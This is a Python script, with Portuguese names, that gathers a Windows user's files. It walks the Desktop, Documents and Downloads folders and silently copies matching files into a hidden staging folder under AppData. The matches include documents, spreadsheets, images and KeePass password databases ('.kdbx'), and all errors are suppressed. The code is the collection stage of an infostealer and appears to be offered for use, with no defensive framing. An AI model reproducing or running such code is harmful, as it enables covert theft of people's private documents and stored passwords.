import os
import shutil
import getpass

def coletar_informacoes():
    usuario = getpass.getuser()
    caminhos_alvo = [
        f"C:\\Users\\{usuario}\\Desktop",
        f"C:\\Users\\{usuario}\\Documents",
        f"C:\\Users\\{usuario}\\Downloads"
    ]

    destino = f"C:\\Users\\{usuario}\\AppData\\Temp_Coleta\\"

    if not os.path.exists(destino):
        os.makedirs(destino)

    extensoes_alvo = ['.txt', '.pdf', '.docx', '.xlsx', '.png', '.jpg', '.kdbx']

    for caminho in caminhos_alvo:
        if os.path.exists(caminho):
            for raiz, diretorios, arquivos in os.walk(caminho):
                for arquivo in arquivos:
                    if any(arquivo.endswith(ext) for ext in extensoes_alvo):
                        caminho_completo = os.path.join(raiz, arquivo)
                        try:
                            shutil.copy(caminho_completo, destino)
                        except Exception:
                            pass

if __name__ == "__main__":
    coletar_informacoes()
```

